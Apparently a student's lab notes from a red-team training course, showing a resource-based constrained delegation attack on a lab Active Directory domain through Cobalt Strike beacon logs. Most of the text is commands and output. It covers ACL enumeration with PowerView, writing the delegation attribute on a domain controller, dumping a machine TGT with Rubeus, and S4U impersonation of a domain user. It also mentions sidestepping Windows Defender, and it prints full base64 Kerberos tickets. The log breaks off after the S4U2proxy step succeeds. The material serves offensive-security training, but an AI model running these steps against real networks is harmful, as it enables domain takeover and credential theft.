Enabling unconstrained or constrained delegation on a computer requires the [SeEnableDelegationPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/enable-computer-and-user-accounts-to-be-trusted-for-delegation) user right assignment on domain controllers, which is only granted to enterprise and domain admins.  Windows 2012 introduced a new type of delegation called resource-based constrained delegation (RBCD), which allows the delegation configuration to be set on the target rather than the source.

To compare - constrained delegation is configured on the "front-end" service via its msDS-AllowedToDelegateTo attribute.  The example provided previously was where cifs/dc-2.dev.cyberbotic.io was in the msDS-AllowedToDelegateTo attribute of SQL-2.  This allowed the SQL-2 computer account to impersonate any user to any service on DC-2, and DC-2 really had no "say" over it.

RBCD reverses this concept and puts control in the hands of the "backend" service instead, via a new attribute called _msDS-AllowedToActOnBehalfOfOtherIdentity_.  This attribute also does not require SeEnableDelegationPrivilege to modify.  Instead, you only need a privilege like WriteProperty, GenericAll, GenericWrite or WriteDacl on the computer object.  This makes it much more likely to present itself as a privilege escalation / lateral movement opportunity.

The two major prerequisites to pull off the attack are:

1. A target computer on which you can modify msDS-AllowedToActOnBehalfOfOtherIdentity**.**
2. Control of another principal that has an SPN.


*note*
`powershell Get-Domain` does not work by itself if `windows defender`  is enabled,  must use `powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1` then `powerpick "powerviewcmds"`

the 1st half of the `RBCD` is able to be completed as regular `DEV\bfarmer` on `WKSTN-2`
```powershell
[12/06 23:42:20] beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[12/06 23:42:23] [*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[12/06 23:42:23] [+] host called home, sent: 143813 bytes
[12/06 23:42:25] beacon> powerpick Get-Domain
[12/06 23:42:26] [*] Tasked beacon to run: Get-Domain (unmanaged)
[12/06 23:42:26] [+] host called home, sent: 22 bytes
[12/06 23:42:26] [+] host called home, sent: 138060 bytes
[12/06 23:42:30] [+] received output:


Forest                  : cyberbotic.io
DomainControllers       : {dc-2.dev.cyberbotic.io}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : cyberbotic.io
PdcRoleOwner            : dc-2.dev.cyberbotic.io
RidRoleOwner            : dc-2.dev.cyberbotic.io
InfrastructureRoleOwner : dc-2.dev.cyberbotic.io
Name                    : dev.cyberbotic.io



```
This query will obtain every domain computer and read their ACL, filtering on the interesting rights.  This will produce a handful of results, but the one shown is the one of interest.  It shows that the Developers group has WriteProperty rights on all properties (see the ObjectAceType) for DC-2.
```powershell
[12/06 23:43:01] beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
[12/06 23:43:01] [*] Tasked beacon to run: Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" } (unmanaged)
[12/06 23:43:01] [+] host called home, sent: 22 bytes
[12/06 23:43:01] [+] host called home, sent: 138060 bytes
[12/06 23:43:10] [+] received output:


AceQualifier           : AccessAllowed
ObjectDN               : CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : ms-Exch-Alt-Recipient
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : Self, WriteProperty
ObjectAceType          : All
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask             : 40
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0


[12/06 23:43:11] [+] received output:
AceQualifier           : AccessAllowed
ObjectDN               : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : GP-Link
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1109
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : GP-Options
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1109
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0


[12/06 23:43:12] [+] received output:
AceQualifier           : AccessAllowed
ObjectDN               : CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : GP-Link
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1116
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : GP-Options
ObjectSID              : S-1-5-21-569305411-121244042-2357301523-1116
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
 
```
Must utilize command below to convert `ObjectSID` 
```powershell
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
```
```powershell
[12/07 00:26:44] beacon> powerpick Get-DomainComputer -Identity wkstn-2 -Properties objectSid
[12/07 00:26:44] [*] Tasked beacon to run: Get-DomainComputer -Identity wkstn-2 -Properties objectSid (unmanaged)
[12/07 00:26:44] [+] host called home, sent: 138070 bytes
[12/07 00:26:49] [+] received output:

objectsid                                   
---------                                   
S-1-5-21-569305411-121244042-2357301523-1109
```
A common means of obtaining a principal with an SPN is to use a computer account.  Since we have elevated privileges on Workstation 2, we can use that.  To start the attack, we need its SID.
```powershell
beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid

objectsid                                   
---------                                   
S-1-5-21-569305411-121244042-2357301523-1109
```
We'll then use this inside an SDDL to create a `security descriptor`.  The content of msDS-AllowedToActOnBehalfOfOtherIdentity must be in raw binary format.
```powershell
[12/07 00:30:39] beacon> powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
[12/07 00:30:43] [+] received output:
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC-2.DEV.CYBERBOTIC.IO/DC=DEV,DC=CYBERBOTIC,DC=IO
VERBOSE: [Get-DomainObject] Extracted domain 'dev.cyberbotic.io' from 'CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io'
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC-2.DEV.CYBERBOTIC.IO/DC=dev,DC=cyberbotic,DC=io
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io)))
VERBOSE: [Set-DomainObject] Setting 'msDS-AllowedToActOnBehalfOfOtherIdentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 67 233 238 33 138 9 58 7 19 145 129 140 85 4 0 0' for object 'DC-2$'
```
checking to ensure that the `msDS-AllowedToActOnBehalfOfOtherIdentity` has been set
```powershell
[12/07 00:31:11] beacon> powerpick Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
[12/07 00:31:11] [+] host called home, sent: 22 bytes
[12/07 00:31:11] [*] Tasked beacon to run: Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity (unmanaged)
[12/07 00:31:11] [+] host called home, sent: 138060 bytes
[12/07 00:31:16] [+] received output:

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}     
```
Next, we use the WKSN-2$ account to perform the S4U impersonation with Rubeus.  The `s4u` command requires a TGT, RC4 or AES hash.  Since we already have elevated access to it, we can just extract its TGT from memory.
```powershell
[12/07 00:41:55] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
[12/07 00:41:59] [*] Tasked beacon to run .NET program: Rubeus.exe triage
[12/07 00:42:00] [+] host called home, sent: 550664 bytes
[12/07 00:42:01] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e7

 ----------------------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                     | Service                                       | EndTime              |
 ----------------------------------------------------------------------------------------------------------------- 
 | 0x3e4   | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 12/7/2023 9:38:23 AM |
 ----------------------------------------------------------------------------------------------------------------- 

```
`dump` the `TGT`
```powershell
[12/07 00:42:29] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
[12/07 00:42:33] [*] Tasked beacon to run .NET program: Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
[12/07 00:42:34] [+] host called home, sent: 550732 bytes
[12/07 00:42:34] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x3e4
[*] Current LUID    : 0x3e7

  UserName                 : WKSTN-2$
  Domain                   : DEV
  LogonId                  : 0x3e4
  UserSID                  : S-1-5-20
  AuthenticationPackage    : Negotiate
  LogonType                : Service
  LogonTime                : 12/6/2023 11:37:09 PM
  LogonServer              : 
  LogonServerDNSDomain     : 
  UserPrincipalName        : 
      doIFuDCCBbSgAwIBBaEDAgEWooIErjCCBKphggSmMIIEoqADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBFwwggRYoAMCARKhAwIBAqKCBEoEggRGjuIjfZXl5fHslslhgorOLYIzG94o/Gpcy8H9C001HCczCkn1HgGR9mU2pVadB8BWw2MCxjALNrY3avvAhXBHdKib62dfJUT1FMoWvB8g5/QI9bOlPVpNAtmjX/NYMK0OhYynJatIB4ansCM2ZBcjb+svJrBruksLskr4o0NL8CPf0vxsrg5epr+hZ/tCLnH12ctPQLgDG8Elip3C9VKJbjAe5ejejsQnMUzrMxqtBLprH1liBRBoks5oQHUxIYQEWq2RtdCt8BVy8mm6RQML5srQTh1YVsU16U3YL71c3DMQQJ+/yD5PmBcjZxQ2yjyVKqRaDfwfk4daeT+GiJSC2sDEyBEmYhvCwqEowS62aonP5ShUUyQYqAU1QNFcIhZ+17S/NCm0QYt3ERv4+FCEkawPh8m+lIneo5S4GMAQYEpBabFkW2KdApBw6tjoP5pchrd42fhZ0U6fTihOkaD3TMysGc6l406dDWTCjz943e8c8eD6K6OMdqA3bJH0nA4EYlpRqrFrJvvK3n02+iwFkPNcDlsD31f+X8d0X91d4cdfzkecmsP+Z7JvSZFvLBDZC1BUNAXlBEpvrOpb2vN2VYC2s7byMyoSJ1IImNDpWnqz4S1tefT8t7PxCYRkfDb/b70f8gaRHgp1mhek3FyobrXEc1U5DYlMNdZYz0zxUPWUIZGR09E49eCd7Hj9hFPCjt1a/om4XIQRXt7etYpFZhBY0nR//kjbiRCBfoNWJ0ZzbASVn5esqBSJGeuXKUtmw5lR5Nbw/3c5e7f879RXd/PZcqi02bqKGk3To6g35ljkKNZ9IgK2qteIiYOgWwd3rWUyEjl3wd9q97R5GfNqE1NBEiaraFJHhc0tlzGwPA1WjMIiVH0WSPSqOn2O/LwTC/+tQPjvzzFMYE0pkMMMCmXL0DNu49VJZwdaMOrmSFpKmCBTbjKxmYz3oa6lo2s3iBip77wBditWjj8Ek33UOwVxcb7mDchDRt6thecmfW25k2pb7+rdvTYszf5UYAdL9Vr6L4XSd/cMzWaDHzO57A9sHvQjBkiieI3DhRihN5KvMrF6k5rlhzG5k4JNocV3YDZ/mogTvbCk5WBWsDW0mYe7Q/duq8LiDn1biH85yiXlURr6856l3Ow0j4/gBj874QBrFvcCmwwZqtjRxvMCB2/WniYYrqE35SCsly9o5Mxc+45m28m/6vfdH8FwCudbmgL2itqhstNWWDkunxzHLqUovK9I2oxqJy5ATAi/2bCIdBul0FYfjlWR+eDn02U57JTp5a4b5xAwPFhfILjD2iHt5gLmYNYPPOqUiPgqbbypS8ZPBAQCyWA6Jh+dy8Mki9rQB+/yiRqgFC5tqlAy5M7+BHKzsRV7mc9etwS8LnBfSok2IoIDmBwczRkNibOLnEiLyoL3lJBbU139Ezx7azaitYm8gn6r2G7+6MdzIcN2T1H5CgKjgfUwgfKgAwIBAKKB6gSB532B5DCB4aCB3jCB2zCB2KArMCmgAwIBEqEiBCB9H5vOR4U7BHUKH63X7tle6HRWWJKEr9wQCtnAxoMZ9aETGxFERVYuQ1lCRVJCT1RJQy5JT6IVMBOgAwIBAaEMMAobCFdLU1ROLTIkowcDBQBA4QAApREYDzIwMjMxMjA2MjMzODIzWqYRGA8yMDIzMTIwNzA5MzgyM1qnERgPMjAyMzEyMTMyMzM4MjNaqBMbEURFVi5DWUJFUkJPVElDLklPqSYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw==
```
perform the `s4u` 
```powershell
[12/07 00:43:12] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuDCCBbSgAwIBBaEDAgEWooIErjCCBKphggSmMIIEoqADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBFwwggRYoAMCARKhAwIBAqKCBEoEggRGjuIjfZXl5fHslslhgorOLYIzG94o/Gpcy8H9C001HCczCkn1HgGR9mU2pVadB8BWw2MCxjALNrY3avvAhXBHdKib62dfJUT1FMoWvB8g5/QI9bOlPVpNAtmjX/NYMK0OhYynJatIB4ansCM2ZBcjb+svJrBruksLskr4o0NL8CPf0vxsrg5epr+hZ/tCLnH12ctPQLgDG8Elip3C9VKJbjAe5ejejsQnMUzrMxqtBLprH1liBRBoks5oQHUxIYQEWq2RtdCt8BVy8mm6RQML5srQTh1YVsU16U3YL71c3DMQQJ+/yD5PmBcjZxQ2yjyVKqRaDfwfk4daeT+GiJSC2sDEyBEmYhvCwqEowS62aonP5ShUUyQYqAU1QNFcIhZ+17S/NCm0QYt3ERv4+FCEkawPh8m+lIneo5S4GMAQYEpBabFkW2KdApBw6tjoP5pchrd42fhZ0U6fTihOkaD3TMysGc6l406dDWTCjz943e8c8eD6K6OMdqA3bJH0nA4EYlpRqrFrJvvK3n02+iwFkPNcDlsD31f+X8d0X91d4cdfzkecmsP+Z7JvSZFvLBDZC1BUNAXlBEpvrOpb2vN2VYC2s7byMyoSJ1IImNDpWnqz4S1tefT8t7PxCYRkfDb/b70f8gaRHgp1mhek3FyobrXEc1U5DYlMNdZYz0zxUPWUIZGR09E49eCd7Hj9hFPCjt1a/om4XIQRXt7etYpFZhBY0nR//kjbiRCBfoNWJ0ZzbASVn5esqBSJGeuXKUtmw5lR5Nbw/3c5e7f879RXd/PZcqi02bqKGk3To6g35ljkKNZ9IgK2qteIiYOgWwd3rWUyEjl3wd9q97R5GfNqE1NBEiaraFJHhc0tlzGwPA1WjMIiVH0WSPSqOn2O/LwTC/+tQPjvzzFMYE0pkMMMCmXL0DNu49VJZwdaMOrmSFpKmCBTbjKxmYz3oa6lo2s3iBip77wBditWjj8Ek33UOwVxcb7mDchDRt6thecmfW25k2pb7+rdvTYszf5UYAdL9Vr6L4XSd/cMzWaDHzO57A9sHvQjBkiieI3DhRihN5KvMrF6k5rlhzG5k4JNocV3YDZ/mogTvbCk5WBWsDW0mYe7Q/duq8LiDn1biH85yiXlURr6856l3Ow0j4/gBj874QBrFvcCmwwZqtjRxvMCB2/WniYYrqE35SCsly9o5Mxc+45m28m/6vfdH8FwCudbmgL2itqhstNWWDkunxzHLqUovK9I2oxqJy5ATAi/2bCIdBul0FYfjlWR+eDn02U57JTp5a4b5xAwPFhfILjD2iHt5gLmYNYPPOqUiPgqbbypS8ZPBAQCyWA6Jh+dy8Mki9rQB+/yiRqgFC5tqlAy5M7+BHKzsRV7mc9etwS8LnBfSok2IoIDmBwczRkNibOLnEiLyoL3lJBbU139Ezx7azaitYm8gn6r2G7+6MdzIcN2T1H5CgKjgfUwgfKgAwIBAKKB6gSB532B5DCB4aCB3jCB2zCB2KArMCmgAwIBEqEiBCB9H5vOR4U7BHUKH63X7tle6HRWWJKEr9wQCtnAxoMZ9aETGxFERVYuQ1lCRVJCT1RJQy5JT6IVMBOgAwIBAaEMMAobCFdLU1ROLTIkowcDBQBA4QAApREYDzIwMjMxMjA2MjMzODIzWqYRGA8yMDIzMTIwNzA5MzgyM1qnERgPMjAyMzEyMTMyMzM4MjNaqBMbEURFVi5DWUJFUkJPVElDLklPqSYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw== /nowrap
[12/07 00:43:16] [*] Tasked beacon to run .NET program: Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuDCCBbSgAwIBBaEDAgEWooIErjCCBKphggSmMIIEoqADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBFwwggRYoAMCARKhAwIBAqKCBEoEggRGjuIjfZXl5fHslslhgorOLYIzG94o/Gpcy8H9C001HCczCkn1HgGR9mU2pVadB8BWw2MCxjALNrY3avvAhXBHdKib62dfJUT1FMoWvB8g5/QI9bOlPVpNAtmjX/NYMK0OhYynJatIB4ansCM2ZBcjb+svJrBruksLskr4o0NL8CPf0vxsrg5epr+hZ/tCLnH12ctPQLgDG8Elip3C9VKJbjAe5ejejsQnMUzrMxqtBLprH1liBRBoks5oQHUxIYQEWq2RtdCt8BVy8mm6RQML5srQTh1YVsU16U3YL71c3DMQQJ+/yD5PmBcjZxQ2yjyVKqRaDfwfk4daeT+GiJSC2sDEyBEmYhvCwqEowS62aonP5ShUUyQYqAU1QNFcIhZ+17S/NCm0QYt3ERv4+FCEkawPh8m+lIneo5S4GMAQYEpBabFkW2KdApBw6tjoP5pchrd42fhZ0U6fTihOkaD3TMysGc6l406dDWTCjz943e8c8eD6K6OMdqA3bJH0nA4EYlpRqrFrJvvK3n02+iwFkPNcDlsD31f+X8d0X91d4cdfzkecmsP+Z7JvSZFvLBDZC1BUNAXlBEpvrOpb2vN2VYC2s7byMyoSJ1IImNDpWnqz4S1tefT8t7PxCYRkfDb/b70f8gaRHgp1mhek3FyobrXEc1U5DYlMNdZYz0zxUPWUIZGR09E49eCd7Hj9hFPCjt1a/om4XIQRXt7etYpFZhBY0nR//kjbiRCBfoNWJ0ZzbASVn5esqBSJGeuXKUtmw5lR5Nbw/3c5e7f879RXd/PZcqi02bqKGk3To6g35ljkKNZ9IgK2qteIiYOgWwd3rWUyEjl3wd9q97R5GfNqE1NBEiaraFJHhc0tlzGwPA1WjMIiVH0WSPSqOn2O/LwTC/+tQPjvzzFMYE0pkMMMCmXL0DNu49VJZwdaMOrmSFpKmCBTbjKxmYz3oa6lo2s3iBip77wBditWjj8Ek33UOwVxcb7mDchDRt6thecmfW25k2pb7+rdvTYszf5UYAdL9Vr6L4XSd/cMzWaDHzO57A9sHvQjBkiieI3DhRihN5KvMrF6k5rlhzG5k4JNocV3YDZ/mogTvbCk5WBWsDW0mYe7Q/duq8LiDn1biH85yiXlURr6856l3Ow0j4/gBj874QBrFvcCmwwZqtjRxvMCB2/WniYYrqE35SCsly9o5Mxc+45m28m/6vfdH8FwCudbmgL2itqhstNWWDkunxzHLqUovK9I2oxqJy5ATAi/2bCIdBul0FYfjlWR+eDn02U57JTp5a4b5xAwPFhfILjD2iHt5gLmYNYPPOqUiPgqbbypS8ZPBAQCyWA6Jh+dy8Mki9rQB+/yiRqgFC5tqlAy5M7+BHKzsRV7mc9etwS8LnBfSok2IoIDmBwczRkNibOLnEiLyoL3lJBbU139Ezx7azaitYm8gn6r2G7+6MdzIcN2T1H5CgKjgfUwgfKgAwIBAKKB6gSB532B5DCB4aCB3jCB2zCB2KArMCmgAwIBEqEiBCB9H5vOR4U7BHUKH63X7tle6HRWWJKEr9wQCtnAxoMZ9aETGxFERVYuQ1lCRVJCT1RJQy5JT6IVMBOgAwIBAaEMMAobCFdLU1ROLTIkowcDBQBA4QAApREYDzIwMjMxMjA2MjMzODIzWqYRGA8yMDIzMTIwNzA5MzgyM1qnERgPMjAyMzEyMTMyMzM4MjNaqBMbEURFVi5DWUJFUkJPVElDLklPqSYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw== /nowrap
[12/07 00:43:17] [+] host called home, sent: 554762 bytes
[12/07 00:43:17] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'WKSTN-2$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88

[12/07 00:43:17] [+] received output:
[+] S4U2self success!
[*] Got a TGS for 'nlamb' to 'WKSTN-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFoDCCBZygAwIBBaEDAgEWooIEqjCCBKZhggSiMIIEnqADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPohUwE6ADAgEBoQwwChsIV0tTVE4tMiSjggRpMIIEZaADAgESoQMCAQKiggRXBIIEU2G1tdP8wiYL1VINBAHdQ2S8uc4+ooXoMn6QJ994WDZN+TlqVo5neXuToCcG1LTDlhcOhjf6Bque1YC3mlBYqFpQo4y7aGOHOGtfgs9QGZ8+egDAlR/H7U9wdALyWw3mBpZBxbKv2HQ2W3Zllo5gG+m9RUPXpOguDsBWzJIZfD7xmE0v8+t4uUf5E8pnS0NmjrkBqzzVjLL/Kk/QBFDfVjd5K3Ay5wfsHZD3rpeCpJTVKdENWXo4N4BwqlB4sy/T/5pAwhoLtgPhF5Rgv/4twbzRu0m1KI4ciKXN1LjQYBwzXHlhG5FC7js+ew1iUtWWpmJQyq6qDSVqcxEuRQEV3qHqMJWZzKGDuvL4IM9ECA88OfydECLThIfAWiyjI+H4p1GDpnUVnCyNF/oZYZXzLRovJ0tQqy3Lc3e6WpV4K4xM9ITNrW2oZnnucN2UyHjiMEqGAdkTgTZEsJi43qSz5waz//gMWUVJsQHLlvjbdM8J5T0zZ0rBuzXnS+yQJBnfq47Bi74qcNc8WDu83IjYuJYwcJ/6HXuoYtgd+D7rfZ8RTERxqM1Nt43Aaq39mdn+AaWsCY4FVVNJePL4Tc0qnc1SZpI5gDMrTsFEYm64ug+aRDNbP033Mk+ouPjb17mjTgjpS+HrknJ/Pov5mnvEMvKQwaQNJm0dkrb7hJOPKDr0cb+nuNI1aAThEnH5IetbGD6rxS3Fe+aQI4h6/k4BSjDN47DTnVM69oDC/OGPEcLHfvxF669/LAO6vTH5dilg72QcmyLkGie7kE6NvFBLx/Zmx2QXnpXyMEb1X+j0hZEkoheLtmVJ8TQk7Q9i2lLq7Yc5Nkw+J01Xx/k7S3FR9A6wjKfz5J8a9szfVbseSXKw/hrsB0nKCCpWV0KsE0n+qSCaDZK8w7HqXEWwcmFJAoBxdyMA64MYlDrGZ1wYvtYi6ZCvwNFZ6CftOXmZTFZiY749/pH2SXW2IKuBbhNcgDkAHOXuaA1DBGFjvamttej/G4xAnYr6pt4UQuWgfOntPEXR3rOA17tGynXZONgp1NALce4Z02aemJYiRfObdGtJ/j9gxswtq73FMdXsbrTGd5Sd7Zy5ll6AV3RPutxWgOWitPdxCssE6wl2rM5F1mquEZQT7Srm3i0XPQcLqF1GkgqfugLB/s6JoWE6ka2AD76dr731/VoLWjxqPbB0rWacwympTJkPBOEZWiTHDkYEG0qFOxjO1XLhGKB9XDkyf1vldLNW+Gp8i6QhATAvZSS1aNm4UGb5+mJhGIEd6iUi3akCVwhUIjZ6S6NjRsByL6k65KhAfmymTxsMd8torLfH4b01wJuJId3DVv143doyffpCFBFZc7umPsjWbkSpFtwVAJlsVIcwTuvRctFaDbTmRJB9PRjzAF9etXmguVB496/MLLSb3+k+HugxRBJ8XmtwLNzxKS/E4gxs6x+arJny1EmI5yIRGRniLXDMjLTmEnXqLKOB4TCB3qADAgEAooHWBIHTfYHQMIHNoIHKMIHHMIHEoCswKaADAgESoSIEIGrwPBsU7Kk/pI+n/ezocRpVEo3ouGIfU6F4bJCybuFVoRMbEURFVi5DWUJFUkJPVElDLklPohIwEKADAgEKoQkwBxsFbmxhbWKjBwMFAEChAAClERgPMjAyMzEyMDcwMDQzMTdaphEYDzIwMjMxMjA3MDkzODIzWqcRGA8yMDIzMTIxMzIzMzgyM1qoExsRREVWLkNZQkVSQk9USUMuSU+pFTAToAMCAQGhDDAKGwhXS1NUTi0yJA==

[*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':

